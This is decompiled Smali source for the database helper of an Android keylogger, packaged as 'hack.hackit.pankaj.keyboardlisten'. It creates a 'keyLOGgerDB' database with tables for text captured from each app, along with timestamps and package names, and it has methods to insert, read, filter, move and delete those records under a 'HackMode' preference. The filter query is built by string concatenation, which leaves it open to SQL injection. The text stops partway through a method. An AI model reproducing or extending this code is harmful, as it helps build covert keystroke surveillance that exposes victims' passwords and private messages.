.class public Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;
.super Landroid/database/sqlite/SQLiteOpenHelper;
.source "MyDatabaseHelper.java"


# static fields
.field public static final COLUMN_APPDATETIME:Ljava/lang/String; = "App_DateTime"

.field public static final COLUMN_APPNAME:Ljava/lang/String; = "Application_Name"

.field public static final COLUMN_APPTYPEDTEXT:Ljava/lang/String; = "TypedText"

.field public static final COLUMN_PACKAGENAME:Ljava/lang/String; = "Package_Name"

.field public static final COLUMN_SRNO:Ljava/lang/String; = "SrNo"

.field private static final DATABASE_NAME:Ljava/lang/String; = "keyLOGgerDB"

.field private static final DATABASE_VERSION:I = 0x2

.field public static final TABLE_KEYEVENTS:Ljava/lang/String; = "Appwise_KeyEvents"

.field public static final TABLE_SAVED_KEYEVENTS:Ljava/lang/String; = "Saved_Appwise_KeyEvents"

.field private static final createKeyEventTable:Ljava/lang/String; = "create table if not exists Appwise_KeyEvents(SrNo integer primary key autoincrement,Application_Name text not null,Package_Name text not null,App_DateTime datetime not null,TypedText text not null)"

.field private static final createSavedKeyEventTable:Ljava/lang/String; = "create table if not exists Saved_Appwise_KeyEvents(SrNo integer primary key autoincrement,Application_Name text not null,Package_Name text not null,App_DateTime datetime not null,TypedText text not null)"


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 3
    .param p1, "context"    # Landroid/content/Context;

    .prologue
    .line 49
    const-string v0, "keyLOGgerDB"

    const/4 v1, 0x0

    const/4 v2, 0x2

    invoke-direct {p0, p1, v0, v1, v2}, Landroid/database/sqlite/SQLiteOpenHelper;-><init>(Landroid/content/Context;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)V

    .line 50
    return-void
.end method

.method public static getEventData()Ljava/util/ArrayList;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/util/ArrayList",
            "<",
            "Ljava/lang/String;",
            ">;"
        }
    .end annotation

    .prologue
    .line 206
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    return-object v0
.end method


# virtual methods
.method public deleteRecord(Lhack/hackit/pankaj/keyboardlisten/KeyEventData;Ljava/lang/String;)V
    .locals 7
    .param p1, "data"    # Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    .param p2, "table_name"    # Ljava/lang/String;

    .prologue
    const/4 v6, 0x0

    .line 251
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    .line 254
    .local v0, "db":Landroid/database/sqlite/SQLiteDatabase;
    const-string v1, "Saved"

    invoke-virtual {p2, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 256
    const-string v1, "Saved_Appwise_KeyEvents"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "SrNo=\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_SrNo()J

    move-result-wide v4

    invoke-virtual {v2, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2, v6}, Landroid/database/sqlite/SQLiteDatabase;->delete(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I

    .line 267
    :goto_0
    return-void

    .line 260
    :cond_0
    const-string v1, "Appwise_KeyEvents"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "SrNo=\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_SrNo()J

    move-result-wide v4

    invoke-virtual {v2, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "\'"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2, v6}, Landroid/database/sqlite/SQLiteDatabase;->delete(Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;)I

    goto :goto_0
.end method

.method public filterData(Ljava/lang/String;Ljava/lang/String;)Ljava/util/ArrayList;
    .locals 8
    .param p1, "filterKey"    # Ljava/lang/String;
    .param p2, "table_name"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Lhack/hackit/pankaj/keyboardlisten/KeyEventData;",
            ">;"
        }
    .end annotation

    .prologue
    .line 212
    new-instance v5, Ljava/util/ArrayList;

    invoke-direct {v5}, Ljava/util/ArrayList;-><init>()V

    .line 213
    .local v5, "temp":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lhack/hackit/pankaj/keyboardlisten/KeyEventData;>;"
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2

    .line 214
    .local v2, "db":Landroid/database/sqlite/SQLiteDatabase;
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Select * from Appwise_KeyEvents where UPPER(Application_Name) like UPPER(\'%"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "%\') order by "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "SrNo"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " DESC limit 100;"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 216
    .local v4, "query":Ljava/lang/String;
    const-string v6, "Saved"

    invoke-virtual {p2, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    .line 218
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Select * from Saved_Appwise_KeyEvents where UPPER(Application_Name) like UPPER(\'%"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "%\') order by "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "SrNo"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, " DESC limit 100;"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 221
    :cond_0
    const/4 v6, 0x0

    invoke-virtual {v2, v4, v6}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 224
    .local v1, "cursor":Landroid/database/Cursor;
    const-string v3, ""

    .line 229
    .local v3, "psd":Ljava/lang/String;
    if-eqz v1, :cond_2

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v6

    if-lez v6, :cond_2

    .line 231
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    .line 233
    :cond_1
    new-instance v0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;

    invoke-direct {v0}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;-><init>()V

    .line 234
    .local v0, "Lgs":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    const-string v6, "SrNo"

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-virtual {v0, v6, v7}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_SrNo(J)V

    .line 235
    const-string v6, "Application_Name"

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_ApplicationName(Ljava/lang/String;)V

    .line 236
    const-string v6, "Package_Name"

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_AppPackageName(Ljava/lang/String;)V

    .line 237
    const-string v6, "App_DateTime"

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_AppDateTime(Ljava/lang/String;)V

    .line 238
    const-string v6, "TypedText"

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v6

    invoke-interface {v1, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v0, v6}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_TypedText(Ljava/lang/String;)V

    .line 239
    invoke-virtual {v5, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 240
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-nez v6, :cond_1

    .line 242
    .end local v0    # "Lgs":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    :cond_2
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    .line 244
    sget-object v6, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v7, "filter Completed"

    invoke-virtual {v6, v7}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 245
    return-object v5
.end method

.method public getLastRecord(Ljava/lang/String;)Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    .locals 8
    .param p1, "table_name"    # Ljava/lang/String;

    .prologue
    .line 148
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2

    .line 149
    .local v2, "db":Landroid/database/sqlite/SQLiteDatabase;
    const-string v4, "Select * from Appwise_KeyEvents order by SrNo DESC limit 1;"

    .line 151
    .local v4, "query":Ljava/lang/String;
    const-string v5, "Saved"

    invoke-virtual {p1, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_0

    .line 153
    const-string v4, "Select * from Saved_Appwise_KeyEvents order by SrNo DESC limit 1;"

    .line 156
    :cond_0
    const/4 v5, 0x0

    invoke-virtual {v2, v4, v5}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 158
    .local v1, "cursor":Landroid/database/Cursor;
    new-instance v0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;

    invoke-direct {v0}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;-><init>()V

    .line 159
    .local v0, "Lgs":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    const-string v3, ""

    .line 160
    .local v3, "psd":Ljava/lang/String;
    if-eqz v1, :cond_1

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v5

    if-lez v5, :cond_1

    .line 162
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    .line 163
    const-string v5, "SrNo"

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v6

    invoke-virtual {v0, v6, v7}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_SrNo(J)V

    .line 164
    const-string v5, "Application_Name"

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_ApplicationName(Ljava/lang/String;)V

    .line 165
    const-string v5, "Package_Name"

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_AppPackageName(Ljava/lang/String;)V

    .line 166
    const-string v5, "App_DateTime"

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_AppDateTime(Ljava/lang/String;)V

    .line 167
    const-string v5, "TypedText"

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v5

    invoke-interface {v1, v5}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_TypedText(Ljava/lang/String;)V

    .line 169
    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    .line 171
    return-object v0
.end method

.method public getRecordLimit()I
    .locals 5

    .prologue
    .line 277
    invoke-static {}, Lhack/hackit/pankaj/keyboardlisten/HKApplication;->getAppContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "HackMode"

    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 278
    .local v1, "sp":Landroid/content/SharedPreferences;
    const-string v2, "DB_Limit"

    const/16 v3, 0x32

    invoke-interface {v1, v2, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    .line 279
    .local v0, "limit":I
    return v0
.end method

.method public getRowCount(Ljava/lang/String;)I
    .locals 5
    .param p1, "table_name"    # Ljava/lang/String;

    .prologue
    .line 176
    const/4 v0, 0x0

    .line 177
    .local v0, "count":I
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2

    .line 179
    .local v2, "db":Landroid/database/sqlite/SQLiteDatabase;
    const-string v3, "Select * from Appwise_KeyEvents;"

    .line 181
    .local v3, "query":Ljava/lang/String;
    const-string v4, "Saved"

    invoke-virtual {p1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 183
    const-string v3, "Select * from Saved_Appwise_KeyEvents;"

    .line 186
    :cond_0
    const/4 v4, 0x0

    invoke-virtual {v2, v3, v4}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 188
    .local v1, "cursor":Landroid/database/Cursor;
    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v0

    .line 189
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    .line 191
    return v0
.end method

.method public insertRecord(Lhack/hackit/pankaj/keyboardlisten/KeyEventData;Ljava/lang/String;)Ljava/lang/String;
    .locals 8
    .param p1, "data"    # Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    .param p2, "table_name"    # Ljava/lang/String;

    .prologue
    const/4 v7, 0x0

    .line 73
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getWritableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    .line 75
    .local v0, "db":Landroid/database/sqlite/SQLiteDatabase;
    new-instance v4, Landroid/content/ContentValues;

    invoke-direct {v4}, Landroid/content/ContentValues;-><init>()V

    .line 77
    .local v4, "values":Landroid/content/ContentValues;
    const-string v5, "Application_Name"

    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_ApplicationName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 78
    const-string v5, "Package_Name"

    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->getAppPackageName()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 79
    const-string v5, "App_DateTime"

    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_AppDateTime()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 80
    const-string v5, "TypedText"

    invoke-virtual {p1}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->get_TypedText()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 84
    const-string v5, "Saved"

    invoke-virtual {p2, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 86
    const-string v5, "Saved_Appwise_KeyEvents"

    invoke-virtual {v0, v5, v7, v4}, Landroid/database/sqlite/SQLiteDatabase;->insert(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J

    move-result-wide v2

    .line 94
    .local v2, "return_Value":J
    :goto_0
    const-string v1, "Success"

    .line 95
    .local v1, "status":Ljava/lang/String;
    const-wide/16 v6, -0x1

    cmp-long v5, v2, v6

    if-nez v5, :cond_0

    .line 97
    const-string v1, "Fail"

    .line 100
    :cond_0
    return-object v1

    .line 90
    .end local v1    # "status":Ljava/lang/String;
    .end local v2    # "return_Value":J
    :cond_1
    const-string v5, "Appwise_KeyEvents"

    invoke-virtual {v0, v5, v7, v4}, Landroid/database/sqlite/SQLiteDatabase;->insert(Ljava/lang/String;Ljava/lang/String;Landroid/content/ContentValues;)J

    move-result-wide v2

    .restart local v2    # "return_Value":J
    goto :goto_0
.end method

.method public moveToSaveRecord(Lhack/hackit/pankaj/keyboardlisten/KeyEventData;)V
    .locals 1
    .param p1, "data"    # Lhack/hackit/pankaj/keyboardlisten/KeyEventData;

    .prologue
    .line 271
    const-string v0, "All"

    invoke-virtual {p0, p1, v0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->deleteRecord(Lhack/hackit/pankaj/keyboardlisten/KeyEventData;Ljava/lang/String;)V

    .line 272
    const-string v0, "Saved"

    invoke-virtual {p0, p1, v0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->insertRecord(Lhack/hackit/pankaj/keyboardlisten/KeyEventData;Ljava/lang/String;)Ljava/lang/String;

    .line 273
    return-void
.end method

.method public onCreate(Landroid/database/sqlite/SQLiteDatabase;)V
    .locals 1
    .param p1, "db"    # Landroid/database/sqlite/SQLiteDatabase;

    .prologue
    .line 55
    const-string v0, "create table if not exists Appwise_KeyEvents(SrNo integer primary key autoincrement,Application_Name text not null,Package_Name text not null,App_DateTime datetime not null,TypedText text not null)"

    invoke-virtual {p1, v0}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    .line 56
    const-string v0, "create table if not exists Saved_Appwise_KeyEvents(SrNo integer primary key autoincrement,Application_Name text not null,Package_Name text not null,App_DateTime datetime not null,TypedText text not null)"

    invoke-virtual {p1, v0}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    .line 57
    return-void
.end method

.method public onUpgrade(Landroid/database/sqlite/SQLiteDatabase;II)V
    .locals 2
    .param p1, "db"    # Landroid/database/sqlite/SQLiteDatabase;
    .param p2, "oldVersion"    # I
    .param p3, "newVersion"    # I

    .prologue
    .line 62
    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v1, "TABLE DROPPED....."

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 64
    const-string v0, "drop table if exists Appwise_KeyEvents"

    invoke-virtual {p1, v0}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    .line 65
    const-string v0, "drop table if exists Saved_Appwise_KeyEvents"

    invoke-virtual {p1, v0}, Landroid/database/sqlite/SQLiteDatabase;->execSQL(Ljava/lang/String;)V

    .line 67
    invoke-virtual {p0, p1}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->onCreate(Landroid/database/sqlite/SQLiteDatabase;)V

    .line 68
    return-void
.end method

.method public readAllEventData(Ljava/lang/String;)Ljava/util/ArrayList;
    .locals 10
    .param p1, "table_name"    # Ljava/lang/String;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/lang/String;",
            ")",
            "Ljava/util/ArrayList",
            "<",
            "Lhack/hackit/pankaj/keyboardlisten/KeyEventData;",
            ">;"
        }
    .end annotation

    .prologue
    .line 106
    new-instance v6, Ljava/util/ArrayList;

    invoke-direct {v6}, Ljava/util/ArrayList;-><init>()V

    .line 107
    .local v6, "temp":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Lhack/hackit/pankaj/keyboardlisten/KeyEventData;>;"
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v2

    .line 109
    .local v2, "db":Landroid/database/sqlite/SQLiteDatabase;
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getRecordLimit()I

    move-result v3

    .line 111
    .local v3, "limit":I
    const-string v7, "Saved"

    invoke-virtual {p1, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 113
    const-string v5, "Select * from Saved_Appwise_KeyEvents order by SrNo DESC;"

    .line 119
    .local v5, "query":Ljava/lang/String;
    :goto_0
    const/4 v7, 0x0

    invoke-virtual {v2, v5, v7}, Landroid/database/sqlite/SQLiteDatabase;->rawQuery(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v1

    .line 122
    .local v1, "cursor":Landroid/database/Cursor;
    const-string v4, ""

    .line 127
    .local v4, "psd":Ljava/lang/String;
    if-eqz v1, :cond_1

    invoke-interface {v1}, Landroid/database/Cursor;->getCount()I

    move-result v7

    if-lez v7, :cond_1

    .line 129
    invoke-interface {v1}, Landroid/database/Cursor;->moveToFirst()Z

    .line 131
    :cond_0
    new-instance v0, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;

    invoke-direct {v0}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;-><init>()V

    .line 132
    .local v0, "Lgs":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    const-string v7, "SrNo"

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v8

    invoke-virtual {v0, v8, v9}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_SrNo(J)V

    .line 133
    const-string v7, "Application_Name"

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_ApplicationName(Ljava/lang/String;)V

    .line 134
    const-string v7, "Package_Name"

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_AppPackageName(Ljava/lang/String;)V

    .line 135
    const-string v7, "App_DateTime"

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_AppDateTime(Ljava/lang/String;)V

    .line 136
    const-string v7, "TypedText"

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v7

    invoke-interface {v1, v7}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Lhack/hackit/pankaj/keyboardlisten/KeyEventData;->set_TypedText(Ljava/lang/String;)V

    .line 137
    invoke-virtual {v6, v0}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 138
    invoke-interface {v1}, Landroid/database/Cursor;->moveToNext()Z

    move-result v7

    if-nez v7, :cond_0

    .line 140
    .end local v0    # "Lgs":Lhack/hackit/pankaj/keyboardlisten/KeyEventData;
    :cond_1
    invoke-interface {v1}, Landroid/database/Cursor;->close()V

    .line 142
    sget-object v7, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v8, "Read Completed"

    invoke-virtual {v7, v8}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    .line 143
    return-object v6

    .line 117
    .end local v1    # "cursor":Landroid/database/Cursor;
    .end local v4    # "psd":Ljava/lang/String;
    .end local v5    # "query":Ljava/lang/String;
    :cond_2
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "Select * from Appwise_KeyEvents order by SrNo DESC limit "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v7

    const-string v8, ";"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .restart local v5    # "query":Ljava/lang/String;
    goto/16 :goto_0
.end method

.method public updateData(JLjava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p1, "srNo"    # J
    .param p3, "time"    # Ljava/lang/String;
    .param p4, "text"    # Ljava/lang/String;

    .prologue
    .line 196
    invoke-virtual {p0}, Lhack/hackit/pankaj/keyboardlisten/MyDatabaseHelper;->getReadableDatabase()Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v1

    .line 197
    .local v1, "db":Landroid/database/sqlite/SQLiteDatabase;
    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    .line 198
    .local v0, "cv":Landroid/content/ContentValues;
    const-string v2, "App_DateTime"

    invoke-virtual {v0, v2, p3}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 199
    const-string v2, "TypedText"

    invoke-virtual {v0, v2, p4}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 200
    const-string v2, "Appwise_KeyEvents"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

